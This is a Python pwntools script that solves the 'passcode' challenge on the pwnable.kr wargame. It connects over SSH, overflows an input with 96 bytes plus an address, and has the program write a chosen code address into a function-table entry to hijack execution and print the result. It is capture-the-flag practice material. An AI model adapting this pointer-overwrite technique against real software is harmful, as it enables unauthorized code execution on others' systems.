#!/usr/bin/python3
from pwn import *

s = ssh('passcode', 'pwnable.kr', 2222, 'guest')
p = s.process('./passcode')

exp_buf = b'a' * 96 + b'\x18\xa0\x04\x08'
p.send(exp_buf + b'\n')

payload = str(0x080485e3)
p.sendline(payload)

p.sendline('fuck')

recv = p.recvall()
recv = recv.replace(b'\xa0', b'')
print(recv.decode('ascii'))



